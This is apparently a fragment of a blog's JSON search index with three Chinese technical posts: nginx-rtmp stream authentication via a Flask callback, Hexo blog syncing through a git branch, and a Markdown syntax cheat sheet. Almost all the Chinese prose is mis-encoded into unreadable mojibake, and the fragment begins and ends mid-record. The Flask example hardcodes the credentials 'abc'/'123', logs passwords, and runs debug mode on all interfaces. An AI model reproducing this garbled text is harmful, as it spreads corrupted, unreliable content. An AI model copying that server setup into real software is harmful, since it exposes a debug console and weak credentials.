)\nåŸç†ä¸»è¦æ˜¯åˆ©ç”¨on_publishè·³è½¬åˆ°å½“å‰é…ç½®çš„ä¸€ä¸ªâ€œlocationâ€ï¼Œåœ¨è¿™é‡Œè¿›è¡ŒéªŒè¯ã€‚å…³é”®ç‚¹åœ¨äºrtmp applicationèŠ‚ç‚¹ä¸‹é¢è¦é…ç½®â€œnotify_method get;â€ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºè·³è½¬çš„æ—¶å€™ï¼Œé»˜è®¤ä»¥POSTæ–¹å¼ä¼ è¾“å‚æ•°ï¼Œä¿®æ”¹æˆGETæ–¹å¼ï¼Œnginxé…ç½®é‡Œå°±å¯ä»¥è½»æ¾å¤„ç†äº†ã€‚ï¼ˆå½“ç„¶nginxé€šè¿‡é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥å¤„ç†postï¼Œåªæ˜¯å¤æ‚ä¸€äº›ï¼‰ã€‚\næˆ‘ä»¬åœ¨æ­¤ä½¿ç”¨pythonçš„åå°æ¡†æ¶flaskå¤„ç†on_publishçš„postè¯·æ±‚ã€‚\nåå°è¿”å›http200å³ä¸ºé€šè¿‡éªŒè¯ï¼Œè¿”å›http500å³ä¸ºéªŒè¯å¤±è´¥ï¼ŒæœåŠ¡å™¨æ‹’ç»è¿æ¥ã€‚\nnginxçš„é…ç½®æ–‡ä»¶ï¼ˆä½äºnginxå®‰è£…ç›®å½•ä¸‹ï¼š.../nginx/conf/nginx.confï¼‰ä¿®æ”¹å¦‚ä¸‹:\nrtmp { server { #listen 1935; listen 10077; chunk_size 4000; application live { live on; on_publish http://localhost:10078/user/auth;//åé¢çš„urlå³flaskç›‘å¬çš„åœ°å€ } application hls { live on; hls on; #hls_path ../nginx-1.7.11.3-Gryphon/html/hls; hls_path ../hls; hls_fragment 5s; on_publish http://localhost:10078/user/auth; } } } pythonçš„flaskåå°ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #!/usr/bin/env python # -*- coding:utf-8 -*- #https://www.jianshu.com/p/0d14ae8f081c #https://blog.csdn.net/wei389083222/article/details/78721074/ #https://blog.csdn.net/weixin_34368949/article/details/85991563 #éªŒè¯åªèƒ½ç”¨postæ–¹æ³• #è™½ç„¶æµå¯†é’¥çš„æ ¼å¼åƒæ˜¯getç±»å‹ï¼Œä½†æ˜¯å¿…é¡»ä½¿ç”¨POSTè·å–å‚æ•°ã€‚ from flask import Flask, request, Response app = Flask(__name__) #ä¼ å…¥urlæ ¼å¼ä¸º: xx.xx.xx.xx:10078/user/auth?usr=xxx\u0026passWord=xxx @app.route('/user/auth',methods=['POST']) def auth(): usr = request.form['usr']#ä»urlåè·å–çš„æ•°æ® passWord = request.form['passWord'] print(usr,'\\t',passWord) #æ­¤å¤„å¯æ”¹ä¸ºä»æ•°æ®åº“è·å–æ•°æ® auth_user='abc' auth_passWord='123' if auth_user == usr and auth_passWord ==passWord: return Response(response='success',status=200)#è¿”å›200çŠ¶æ€ç  else: return Response(status=500)#è¿”å›500çŠ¶æ€ç  #Flask.abort(404) return passWord if __name__ == '__main__': app.run(host='0.0.0.0',port=10078,debug=True)   æ’­æ”¾æƒé™ä¹Ÿå¯ç”¨ç±»ä¼¼on_publishçš„éªŒè¯æ–¹æ³•è¿›è¡Œæ§åˆ¶ã€‚\non_playå’Œon_publish ä¸€æ ·ï¼Œåªæ¥å—postæ–¹æ³•ï¼Œè‹¥éœ€è¦æ¥å—getæ–¹æ³•éœ€è¦åœ¨rtmpä¸­applicationçš„é…ç½®ä¸­æ·»åŠ notify_method get;ï¼Œç„¶åå¯åœ¨http{}éƒ¨åˆ†ä¸­å¤„ç†è°ƒç”¨ï¼ˆè¿™éƒ¨åˆ†è¯­æ³•æˆ‘ä¸å¤ªæ¸…æ¥šï¼Œä¸è¯¦ç»†å±•å¼€ï¼‰ã€‚\nä»¥ä¸‹æ˜¯nginx.confå…³äºon_playçš„ç”¨æ³•\non_play è¯­æ³•ï¼šon_play url ä¸Šä¸‹æ–‡ï¼šrtmp, server, application æè¿°ï¼šè®¾ç½® HTTP æ’­æ”¾å›è°ƒã€‚æ¯æ¬¡ä¸€ä¸ªå®¢æˆ·åˆ†å‘æ’­æ”¾å‘½ä»¤æ—¶ï¼Œä¸€ä¸ª HTTP è¯·æ±‚å¼‚æ­¥å‘é€ï¼Œå‘½ä»¤å¤„ç†ä¼šæŒ‚èµ· - ç›´åˆ°å®ƒè¿”å›ç»“æœç ã€‚ä¹‹åå†è§£æ HTTP ç»“æœç ã€‚\n  HTTP 2XX è¿”å›ç çš„è¯ç»§ç»­ RTMP ä¼šè¯ã€‚\n  HTTP 3XX è¿”å›ç çš„è¯ é‡å®šå‘ RTMP åˆ°å¦ä¸€ä¸ªæµï¼Œè¿™ä¸ªæµçš„åå­—åœ¨ HTTP è¿”å›å¤´çš„ Location è·å–ã€‚å¦‚æœæ–°æµçš„åå­—èµ·å§‹äº rtmp:// ç„¶åè¿œç¨‹ relay ä¼šè¢«åˆ›å»ºã€‚relay è¦æ±‚ IP åœ°å€æ˜¯æŒ‡å®šçš„è€Œä¸æ˜¯åŸŸåï¼Œå¹¶ä¸”åªå·¥ä½œåœ¨ 1.3.10 ç‰ˆæœ¬ä»¥ä¸Šçš„ nginxã€‚å¦è¯·å‚è€ƒ notify_relay_redirectã€‚\n  å…¶ä»–è¿”å›ç çš„è¯ RTMP è¿æ¥ä¸¢å¼ƒã€‚ é‡å®šå‘ä¾‹å­ï¼š\n  http {\nlocation /local_redirect { rewrite ^.$ newname? permanent; } location /remote_redirect { # no domain name here, only ip rewrite ^.$ rtmp://192.168.1.123/someapp/somename? permanent; }\n}\nrtmp { application myapp1 { live on; # stream will be redirected to 'newname' on_play http://localhost:8080/local_redirect; } application myapp2 { live on; # stream will be pulled from remote location # requires nginx \u003e= 1.3.10 on_play http://localhost:8080/remote_redirect; }\n}\n HTTP è¯·æ±‚æ¥æ”¶åˆ°ä¸€äº›ä¸ªå‚æ•°ã€‚åœ¨ application/x-www-form-urlencoded MIME ç±»å‹ä¸‹ä½¿ç”¨ POST æ–¹æ³•ã€‚ä»¥ä¸‹å‚æ•°ä¼šè¢«ä¼ é€ç»™è°ƒç”¨è€…ï¼š * call=playã€‚ * addr - å®¢æˆ·ç«¯ IP åœ°å€ã€‚ * app - application åã€‚ * flashVer - å®¢æˆ·ç«¯ flash ç‰ˆæœ¬ã€‚ * swfUrl - å®¢æˆ·ç«¯ swf urlã€‚ * tcUrl - tcUrlã€‚ * pageUrl - å®¢æˆ·ç«¯é¡µé¢ urlã€‚ * name - æµåã€‚ å‡ºäº†ä¸Šè¿°å‚æ•°ä¹‹å¤–å…¶ä»–æ‰€æœ‰æ’­æ”¾å‘½ä»¤å‚æ•°æ˜¾å¼åœ°å‘é€å›è°ƒã€‚ä¾‹å¦‚å¦‚æœä¸€ä¸ªæµç”± url rtmp://localhost/app/movie?a=100\u0026b=face\u0026foo=bar è®¿é—®ï¼Œç„¶åå‘¢ a,b å’Œ foo å‘é€å›è°ƒã€‚ on_play http://example.com/my_callback; ## è¿‡ç¨‹ä¸­ä½¿ç”¨åˆ°çš„é¢å¤–è½¯ä»¶ * obs * æ‰‹æœºç«¯:å¿«ç›´æ’­ * ffmpegæ¨æµï¼ˆæ²¡ç”¨è¿‡ï¼‰ ","description":"","tags":["nginx","rtmp"],"title":"nginx+rtmp","uri":"/posts/nginx-rtmp/"},{"categories":["tech"],"content":"Hexo+gitPages çš„åšå®¢å¤šç«¯åŒæ­¥ç®¡ç†åŠè¿ç§»  æœ¬æ–‡å‚è€ƒ\nå¦‚ä½•è§£å†³github+Hexoçš„åšå®¢å¤šç»ˆç«¯åŒæ­¥é—®é¢˜\nåˆ©ç”¨Hexoåœ¨å¤šå°ç”µè„‘ä¸Šæäº¤å’Œæ›´æ–°github pagesåšå®¢\næ­å»ºhexoåšå®¢å¹¶ç®€å•çš„å®ç°å¤šç»ˆç«¯åŒæ­¥\nhexoåšå®¢åŒæ­¥ç®¡ç†åŠè¿ç§»\n ä¸»ä½“çš„æ€è·¯æ˜¯å°†åšæ–‡å†…å®¹ç›¸å…³æ–‡ä»¶æ”¾åœ¨Githubé¡¹ç›®ä¸­masterä¸­ï¼Œå°†Hexoé…ç½®å†™åšå®¢ç”¨çš„ç›¸å…³æ–‡ä»¶(åŒ…æ‹¬åšå®¢å†…å®¹ä¸»é¢˜ç­‰ç­‰)æ”¾åœ¨Githubé¡¹ç›®çš„hexoåˆ†æ”¯ä¸Šï¼Œè¿™ä¸ªæ˜¯å…³é”®ï¼Œå¤šç»ˆç«¯çš„åŒæ­¥åªéœ€è¦å¯¹åˆ†æ”¯hexoè¿›è¡Œæ“ä½œã€‚\nåŒæ­¥çš„é¦–æ¬¡æ“ä½œ åœ¨åˆ›å»ºäº†åšå®¢çš„ç›®å½•ä¸‹æ“ä½œï¼Œpushæœ¬åœ°æ–‡ä»¶å¤¹Hexoä¸­çš„å¿…è¦æ–‡ä»¶åˆ°yourname.github.ioçš„hexoåˆ†æ”¯ä¸Šã€‚\nåªæ‰˜ç®¡éƒ¨åˆ†ç”¨äºå¤šç»ˆç«¯çš„åŒæ­¥çš„æ–‡ä»¶\næ³¨æ„ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹ä¸»é¢˜æ—¶ï¼Œè¦åˆ é™¤ç¬¬ä¸‰æ–¹ä¸»é¢˜çš„.gitæ–‡ä»¶å¤¹åˆ é™¤ï¼Œä¸ç„¶æ— æ³•pushåˆ°è¿œç¨‹ä»“åº“\n1 2 3 4 5 6 7  git init //åˆå§‹åŒ–æœ¬åœ°ä»“åº“ git add source //å°†å¿…è¦çš„æ–‡ä»¶ä¾æ¬¡æ·»åŠ ï¼Œæœ‰äº›æ–‡ä»¶å¤¹å¦‚npm installäº§ç”Ÿçš„node_modulesç”±äºè·¯å¾„è¿‡é•¿ä¸å¥½å¤„ç†ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰ç”¨`git add .`å‘½ä»¤äº†ï¼Œè€Œæ˜¯ä¾æ¬¡æ·»åŠ å¿…è¦æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º,å…¶å®ä¹Ÿå¯ä»¥ç”¨'git add .'å‘½ä»¤ï¼Œåœ¨.gitignoreæ–‡ä»¶ä¸­åŠ å…¥ä¸éœ€è¦åŒæ­¥çš„æ–‡ä»¶å³å¯ git commit -m \"Blog Source Hexo\" git branch hexo //æ–°å»ºhexoåˆ†æ”¯ git checkout hexo //åˆ‡æ¢åˆ°hexoåˆ†æ”¯ä¸Š git remote add origin git@github.com:yourname/yourname.github.io.git //å°†æœ¬åœ°ä¸Githubé¡¹ç›®å¯¹æ¥ git push origin hexo //pushåˆ°Githubé¡¹ç›®çš„hexoåˆ†æ”¯ä¸Š   å¤šå‡ºæ¥çš„hexoçš„åˆ†æ”¯ï¼Œç”¨äºæ–‡ä»¶åŒæ­¥ï¼ŒåŸæœ‰çš„masteråˆ†æ”¯ç”¨äºéƒ¨ç½²é™æ€åšå®¢é¡µé¢\nåœ¨æ–°ç»ˆç«¯è¿›è¡Œæ›´æ–°åšå®¢ å…ˆä»githubä¸­æŠŠæ–‡ä»¶cloneåˆ°æœ¬åœ°ï¼Œç„¶åå®‰è£…ç›¸åº”ç»„ä»¶ã€‚ç„¶åé€šè¿‡gitçš„æäº¤åŒæ­¥å†…å®¹ï¼Œç”¨hexoçš„å‘½ä»¤éƒ¨ç½²åšå®¢åˆ°gitPagesé‡Œã€‚\n1 2 3 4 5 6 7 8 9  git clone -b hexo git@github.com:yourname/yourname.github.io.git //å°†Githubä¸­hexoåˆ†æ”¯cloneåˆ°æœ¬åœ° cd yourname.github.io //åˆ‡æ¢åˆ°åˆšåˆšcloneçš„æ–‡ä»¶å¤¹å†… npm install //æ³¨æ„ï¼Œè¿™é‡Œä¸€å®šè¦åˆ‡æ¢åˆ°åˆšåˆšcloneçš„æ–‡ä»¶å¤¹å†…æ‰§è¡Œï¼Œå®‰è£…å¿…è¦çš„æ‰€éœ€ç»„ä»¶ï¼Œä¸ç”¨å†init hexo new post \"new blog name\" //æ–°å»ºä¸€ä¸ª.mdæ–‡ä»¶ï¼Œå¹¶ç¼–è¾‘å®Œæˆè‡ªå·±çš„åšå®¢å†…å®¹ git add source //ç»æµ‹è¯•æ¯æ¬¡åªè¦æ›´æ–°sorcererä¸­çš„æ–‡ä»¶åˆ°Githubä¸­å³å¯ï¼Œå› ä¸ºåªæ˜¯æ–°å»ºäº†ä¸€ç¯‡æ–°åšå®¢ï¼Œå¦‚æœæ›´æ”¹äº†ä¸»é¢˜æ ·å¼çš„è¯è¿˜æ˜¯å»ºè®®ç”¨'git add .' git commit -m \"XX\" git push origin hexo //æ›´æ–°åˆ†æ”¯ hexo d -g //pushæ›´æ–°å®Œåˆ†æ”¯ä¹‹åå°†è‡ªå·±å†™çš„åšå®¢å¯¹æ¥åˆ°è‡ªå·±æ­çš„åšå®¢ç½‘ç«™ä¸Šï¼ŒåŒæ—¶åŒæ­¥äº†Githubä¸­çš„master   å·²æœ‰åšå®¢çš„ç»ˆç«¯æ›´æ–°åšå®¢ è¿›å…¥ç›¸åº”çš„æ–‡ä»¶å¤¹ï¼Œæ›´æ–°åšå®¢ç›´è¡Œå‘½ä»¤å³å¯ã€‚\n1 2 3 4 5 6  git pull origin hexo//å…ˆpullå®Œæˆæœ¬åœ°å’Œè¿œç«¯çš„èåˆ hexo new post \"new blog\" git add . git commit -m \"Blog update\" git push origin hexo hexo d -g   ","description":"","tags":["hexo"],"title":"hexo+gitPages Synchronization","uri":"/posts/hexo-gitpages-synchronization/"},{"categories":["markdown"],"content":"Markdown Syntax  æœ¬æ–‡å‚è€ƒ\nMarkdownåŸºæœ¬è¯­æ³•(ç®€ä¹¦)\nMarkdownå®˜æ–¹æ–‡æ¡£\nMarkdownè¯­æ³•htmlæ”¯æŒ\nMarkdownéƒ¨åˆ†è¯¦ç»†ç”¨æ³•\n  æ ‡é¢˜ Markdown æ”¯æŒä¸¤ç§æ ‡é¢˜çš„è¯­æ³•ï¼Œç±» Setext å’Œç±» atx å½¢å¼ã€‚\n1 2 3 4 5 6 7 8  Atxå½¢å¼ # è¿™æ˜¯ä¸€çº§æ ‡é¢˜ ## è¿™æ˜¯äºŒçº§æ ‡é¢˜ ### è¿™æ˜¯ä¸‰çº§æ ‡é¢˜ #### è¿™æ˜¯å››çº§æ ‡é¢˜ ##### è¿™æ˜¯äº”çº§æ ‡é¢˜ ###### è¿™æ˜¯å…­çº§æ ‡é¢˜   è¿™æ˜¯ä¸€çº§æ ‡é¢˜ è¿™æ˜¯äºŒçº§æ ‡é¢˜ è¿™æ˜¯ä¸‰çº§æ ‡é¢˜ è¿™æ˜¯å››çº§æ ‡é¢˜ è¿™æ˜¯äº”çº§æ ‡é¢˜ è¿™æ˜¯å…­çº§æ ‡é¢˜ 1 2 3 4 5 6 7  Setextå½¢å¼ This is an H1 ============= This is an H2 -------------   This is an H1 This is an H2 æ ¹æ®æ ‡é¢˜ç”Ÿæˆç›®å½• 1  [TOC] æ ¹æ®æ ‡é¢˜è‡ªåŠ¨ç”Ÿæˆç›®å½•   [TOC]\n å­—ä½“ **è¿™æ˜¯åŠ ç²—çš„æ–‡å­—** *è¿™æ˜¯å€¾æ–œçš„æ–‡å­—*` ***è¿™æ˜¯æ–œä½“åŠ ç²—çš„æ–‡å­—*** ~~è¿™æ˜¯åŠ åˆ é™¤çº¿çš„æ–‡å­—~~ åŠ ç²—æµ‹è¯•\nå€¾æ–œæµ‹è¯•\næ–œä½“åŠ ç²—æµ‹è¯•\nåˆ é™¤çº¿æµ‹è¯•\n å¼•ç”¨ \u003eè¿™æ˜¯å¼•ç”¨çš„å†…å®¹ \u003e\u003eè¿™æ˜¯å¼•ç”¨çš„å†…å®¹ \u003e\u003e\u003eå¤šé‡å¼•ç”¨ \u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003eè¿™æ˜¯å¼•ç”¨çš„å†…å®¹  å¼•ç”¨æµ‹è¯•ä¸€\n å¼•ç”¨æµ‹è¯•äºŒ\n å¤šé‡å¼•ç”¨\n        å¼•ç”¨æµ‹è¯•\n            åˆ†å‰²çº¿ --- ---- *** ***** åªè¦ä¸‰ä¸ªä»¥ä¸Šå°±å¯ä»¥\n     å›¾ç‰‡å¼•ç”¨ 1 2 3 4  ![å›¾ç‰‡alt](å›¾ç‰‡åœ°å€ ''å›¾ç‰‡title'') å›¾ç‰‡altå°±æ˜¯æ˜¾ç¤ºåœ¨å›¾ç‰‡ä¸‹é¢çš„æ–‡å­—ï¼Œç›¸å½“äºå¯¹å›¾ç‰‡å†…å®¹çš„è§£é‡Šã€‚ å›¾ç‰‡titleæ˜¯å›¾ç‰‡çš„æ ‡é¢˜ï¼Œå½“é¼ æ ‡ç§»åˆ°å›¾ç‰‡ä¸Šæ—¶æ˜¾ç¤ºçš„å†…å®¹ã€‚titleå¯åŠ å¯ä¸åŠ    1 2  ![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/ u=702257389,1274025419\u0026fm=27\u0026gp=0.jpg \"åŒºå—é“¾\")   æ’å…¥å¸¦æœ‰é“¾æ¥çš„å›¾ç‰‡ 1 2 3 4  [[å›¾ç‰‡ä¸Šä¼ å¤±è´¥...(image-f83b77-1542510791300)]](http://www.baidu.com){:target=\"_blank\"} // å†…é“¾å¼ [[å›¾ç‰‡ä¸Šä¼ å¤±è´¥...(image-4dc956-1542510791300)]][5]{:target=\"_blank\"} // å¼•ç”¨å¼ [5]: http://www.baidu.com   [å›¾ç‰‡ä¸Šä¼ å¤±è´¥...(image-f83b77-1542510791300)]{:target=\"_blank\"}\nå†…é“¾å¼\n[å›¾ç‰‡ä¸Šä¼ å¤±è´¥...(image-f83b77-1542510791300)]{:target=\"blank\"}\nå¤–é“¾å¼\n è¶…é“¾æ¥å¼•ç”¨ 1 2  [è¶…é“¾æ¥å](è¶…é“¾æ¥åœ°å€ \"è¶…é“¾æ¥title\") titleå¯åŠ å¯ä¸åŠ    1 2  [ç®€ä¹¦](http://jianshu.com) [ç™¾åº¦](http://baidu.com)   baidu\næ³¨ï¼šMarkdownæœ¬èº«è¯­æ³•ä¸æ”¯æŒé“¾æ¥åœ¨æ–°é¡µé¢ä¸­æ‰“å¼€ï¼Œè²Œä¼¼ç®€ä¹¦åšäº†å¤„ç†ï¼Œæ˜¯å¯ä»¥çš„ã€‚åˆ«çš„å¹³å°å¯èƒ½å°±ä¸è¡Œäº†ï¼Œå¦‚æœæƒ³è¦åœ¨æ–°é¡µé¢ä¸­æ‰“å¼€çš„è¯å¯ä»¥ç”¨htmlè¯­è¨€çš„aæ ‡ç­¾ä»£æ›¿ã€‚\n\u003ca href=\"è¶…é“¾æ¥åœ°å€\" target=\"_blank\"\u003eè¶…é“¾æ¥å\u003c/a\u003e ç¤ºä¾‹ \u003ca href=\"https://www.jianshu.com/u/1f5ac0cf6a8b\" target=\"_blank\"\u003eç®€ä¹¦\u003c/a\u003e ç®€ä¹¦\n è§†é¢‘æ’å…¥ æ³¨ï¼šMarkdown è¯­æ³•æ˜¯ä¸æ”¯æŒç›´æ¥æ’å…¥è§†é¢‘çš„ æ™®éçš„åšæ³•æ˜¯ æ’å…¥HTMLçš„ iframe æ¡†æ¶ï¼Œé€šè¿‡ç½‘ç«™è‡ªå¸¦çš„åˆ†äº«åŠŸèƒ½è·å–ï¼Œå¦‚æœæ²¡æœ‰å¯ä»¥å°è¯•ç¬¬äºŒç§æ–¹æ³• ç¬¬äºŒæ˜¯ä¼ªé€ æ’­æ”¾ç•Œé¢ï¼Œå®è´¨æ˜¯æ’å…¥è§†é¢‘å›¾ç‰‡ï¼Œç„¶åé€šè¿‡ç‚¹å‡»è·³è½¬åˆ°ç›¸å…³é¡µé¢\nä»£ç 1 æ³¨ï¼šå¤šæ•°ç¬¬ä¸‰æ–¹å¹³å°ä¸æ”¯æŒæ’å…¥\u003ciframe\u003eè§†é¢‘\n1  \u003ciframe height=498 width=510 src='http://player.youku.com/embed/XMjgzNzM0NTYxNg==' frameborder=0 'allowfullscreen'\u003e\u003c/iframe\u003e   ä»£ç 2\n1  [[å›¾ç‰‡ä¸Šä¼ å¤±è´¥...(image-49aefe-1542510791300)]](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A\u0026from=y1.3-tv-grid-1007-9910.86804.1-2#paction){:target=\"_blank\"}    åˆ—è¡¨ 1 2 3 4 5 6 7  æ— åºåˆ—è¡¨ç”¨ä»»ä¸€ç§çš†å¯ - åˆ—è¡¨å†…å®¹ + åˆ—è¡¨å†…å®¹ * åˆ—è¡¨å†…å®¹ æ³¨æ„ï¼š- + * è·Ÿå†…å®¹ä¹‹é—´éƒ½è¦æœ‰ä¸€ä¸ªç©ºæ ¼    åˆ—è¡¨ï¼ˆ-ï¼‰ åˆ—è¡¨ï¼ˆ-ï¼‰   åˆ—è¡¨ï¼ˆ+ï¼‰   åˆ—è¡¨ï¼ˆ*ï¼‰  1 2 3 4 5 6 7  æœ‰åºåˆ—è¡¨å†…å®¹ 1.åˆ—è¡¨å†…å®¹ 2.åˆ—è¡¨å†…å®¹ 3.åˆ—è¡¨å†…å®¹ æ³¨æ„ï¼šåºå·è·Ÿå†…å®¹ä¹‹é—´è¦æœ‰ç©ºæ ¼    ç¬¬ä¸€ç‚¹ ç¬¬äºŒç‚¹ ç¬¬ä¸‰ç‚¹  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  **ä¸Šä¸€çº§å’Œä¸‹ä¸€çº§ä¹‹é—´æ•²ä¸‰ä¸ªç©ºæ ¼å³å¯** - ä¸€çº§æ— åºåˆ—è¡¨å†…å®¹ - äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ - äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ - äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ - ä¸€çº§æ— åºåˆ—è¡¨å†…å®¹ 1. äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ 2. äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ 3. äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ 1. ä¸€çº§æœ‰åºåˆ—è¡¨å†…å®¹ - äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ - äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ - äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ 2. ä¸€çº§æœ‰åºåˆ—è¡¨å†…å®¹ 1. äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ 2. äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ 3. äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹   ä¸Šä¸€çº§å’Œä¸‹ä¸€çº§ä¹‹é—´æ•²ä¸‰ä¸ªç©ºæ ¼å³å¯\n ä¸€çº§æ— åºåˆ—è¡¨å†…å®¹  äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ äºŒçº§æ— åºåˆ—è¡¨å†…å®¹   ä¸€çº§æ— åºåˆ—è¡¨å†…å®¹  äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹     ä¸€çº§æœ‰åºåˆ—è¡¨å†…å®¹  äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ äºŒçº§æ— åºåˆ—è¡¨å†…å®¹ äºŒçº§æ— åºåˆ—è¡¨å†…å®¹   ä¸€çº§æœ‰åºåˆ—è¡¨å†…å®¹  äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹ äºŒçº§æœ‰åºåˆ—è¡¨å†…å®¹     è¡¨æ ¼ è¡¨å¤´|è¡¨å¤´|è¡¨å¤´ ---|:--:|---: å†…å®¹|å†…å®¹|å†…å®¹ å†…å®¹|å†…å®¹|å†…å®¹ ç¬¬äºŒè¡Œåˆ†å‰²è¡¨å¤´å’Œå†…å®¹ã€‚ - æœ‰ä¸€ä¸ªå°±è¡Œï¼Œä¸ºäº†å¯¹é½ï¼Œå¤šåŠ äº†å‡ ä¸ª æ–‡å­—é»˜è®¤å±…å·¦ -ä¸¤è¾¹åŠ ï¼šè¡¨ç¤ºæ–‡å­—å±…ä¸­ -å³è¾¹åŠ ï¼šè¡¨ç¤ºæ–‡å­—å±…å³ æ³¨ï¼šåŸç”Ÿçš„è¯­æ³•ä¸¤è¾¹éƒ½è¦ç”¨ | åŒ…èµ·æ¥ã€‚æ­¤å¤„çœç•¥ 1 2 3 4 5  å§“å|æŠ€èƒ½|æ’è¡Œ --|:--:|--: åˆ˜å¤‡|å“­|å¤§å“¥ å…³ç¾½|æ‰“|äºŒå“¥ å¼ é£|éª‚|ä¸‰å¼Ÿ      å§“å æŠ€èƒ½ æ’è¡Œ     åˆ˜å¤‡ å“­ å¤§å“¥   å…³ç¾½ æ‰“ äºŒå“¥   å¼ é£ éª‚ ä¸‰å¼Ÿ    Typoraç¼–è¾‘å™¨ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨crtl+Tï¼Œæˆ–è€…åœ¨èœå•æ®µè½ä¸­æ‰¾åˆ°è¡¨æ ¼ç”Ÿæˆ\n ä»£ç å¼•ç”¨ å•è¡Œä»£ç \n1  `ä»£ç å†…å®¹`   int main(){return 0;}\nä»£ç å—\n1 2 3 4 5  (```)language ä»£ç ... ä»£ç ... ä»£ç ... (```)    æ³¨ï¼šä¸ºäº†é˜²æ­¢è½¬è¯‘ï¼Œå‰åä¸‰ä¸ªåå¼•å·å¤„åŠ äº†å°æ‹¬å·ï¼Œå®é™…æ˜¯æ²¡æœ‰çš„ã€‚è¿™é‡Œåªæ˜¯ç”¨æ¥æ¼”ç¤ºï¼Œå®é™…ä¸­å»æ‰ä¸¤è¾¹å°æ‹¬å·å³å¯ã€‚\n 1 2 3 4 5 6  #include\u003ciostream\u003eusing namespace std; int main(){ cout\u003c\u003c \"hello markdown\"; return 0; }   æ ¼å¼åŒ–ä»£ç htmlç‰ˆ 1 2 3 4  \u003cpre\u003e ## è¿™æ˜¯ä¸€ä¸ªä¸èµ·ä½œç”¨çš„æ ‡é¢˜ \u003c/pre\u003e   ## è¿™æ˜¯ä¸€ä¸ªä¸èµ·ä½œç”¨çš„æ ‡é¢˜  æµç¨‹å›¾ æ³¨ï¼š** st=\u003estart: å¼€å§‹ çš„ï¼šåé¢ä¿æŒç©ºæ ¼**\n   å½¢å‚ å®å‚ å«ä¹‰     tag st æ ‡ç­¾ (å¯ä»¥è‡ªå®šä¹‰)   =\u003e =\u003e èµ‹å€¼   type start ç±»å‹ (6ç§ç±»å‹)   content å¼€å§‹ æè¿°å†…å®¹ (å¯ä»¥è‡ªå®šä¹‰)   :\u003eurl http://www.baidu.com[blank] é“¾æ¥ä¸è·³è½¬æ–¹å¼ å…¼å®¹æ€§å¾ˆå·®       6ç§ç±»å‹ å«ä¹‰     start å¯åŠ¨   end ç»“æŸ   operation ç¨‹åº   subroutine å­ç¨‹åº   condition æ¡ä»¶   inputoutput è¾“å‡º       å½¢å‚ å®å‚ å«ä¹‰     -\u003e -\u003e è¿æ¥   condition c1 æ¡ä»¶   (å¸ƒå°”å€¼,æ–¹å‘) (yes,right) å¦‚æœæ»¡è¶³å‘å³è¿æ¥ï¼Œ4ç§æ–¹å‘ï¼šright ï¼Œleftï¼Œup ï¼Œdown é»˜è®¤ä¸ºï¼šdown    æ³¨ï¼šoperation (ç¨‹åº); subroutine (å­ç¨‹åº) ;condition (æ¡ä»¶)ï¼Œéƒ½å¯ä»¥åœ¨æ‹¬å·é‡ŒåŠ å…¥è¿æ¥æ–¹å‘ã€‚\n1 2 3 4 5 6 7 8 9  ```flow st=\u003estart: å¼€å§‹ op=\u003eoperation: My Operation cond=\u003econdition: Yes or No? e=\u003eend st-\u003eop-\u003econd cond(yes)-\u003ee cond(no)-\u003eop \u0026```   st=\u003estart: å¼€å§‹ op=\u003eoperation: My Operation cond=\u003econdition: Yes or No? e=\u003eend st-\u003eop-\u003econd cond(yes)-\u003ee cond(no)-\u003eop \u0026``` é€‰é¡¹æ¡† 1 2 3 4  - [x] é€‰é¡¹ä¸€ - [ ] é€‰é¡¹äºŒ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š-ã€[x]ã€å’Œé€‰æ‹©ä¸€ä¹‹é—´éƒ½è¦æœ‰ç©ºæ ¼ï¼Œå¦‚æœä¸ä¸‹x[ ]ä¸­ä¹Ÿè¦æœ‰ç©ºæ ¼    é€‰é¡¹ä¸€ é€‰é¡¹äºŒ   æ•°å­¦å…¬å¼ æ”¯æŒLaTexçš„æ•°å­¦å…¬å¼ï¼Œå‚è€ƒhttps://www.jianshu.com/p/2bbec51d756f\næ•°å­¦å…¬å¼ï¼ˆMathJax)ï¼Œå‚è€ƒhttps://www.jianshu.com/p/a0aa94ef8ab2\næ³¨ï¼š1ä¸ª$å·¦å¯¹é½ï¼Œ2ä¸ªå±…ä¸­\n1 2  $$ x \\href{why-equal.html}{=} y^2 + 1 $$ $ x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}. $   $$ x \\href{why-equal.html}{=} y^2 +1 $$\nä½¿ç”¨Typoraçš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨ 